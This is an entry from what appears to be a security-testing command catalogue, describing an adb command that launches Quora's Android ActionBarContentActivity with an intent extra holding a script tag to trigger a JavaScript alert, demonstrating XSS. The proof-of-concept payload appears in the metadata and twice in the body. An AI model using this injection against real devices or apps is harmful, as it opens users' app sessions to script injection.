---
data: >-
  am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e
  url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
tags:
  - xss
  - android
type: command
executor: bash
platforms:
  - Android
id: a02ea96d-337e-4162-9f6d-b86ca1fb1a80
created_at: '2025-12-13T23:52:44.034Z'
updated_at: '2025-12-13T23:52:44.034Z'
verified: false
validated: true
submitted: true
---
# am-start-actionbar-xss-alert

## Command

```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```

## Description

Launches Quora's ActionBarContentActivity with intent extras to trigger XSS via a JavaScript alert payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component name (package/activity) | Yes |
| -e url | Dummy URL extra | Yes |
| -e html | Malicious HTML payload | Yes |

## Examples

### Basic Usage

```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```

## Expected Output

Activity launches and alert(123) displays.

## Related

- [[procedures/Launch-ActionBarContentActivity-with-Malicious-HTML-via-ADB]]
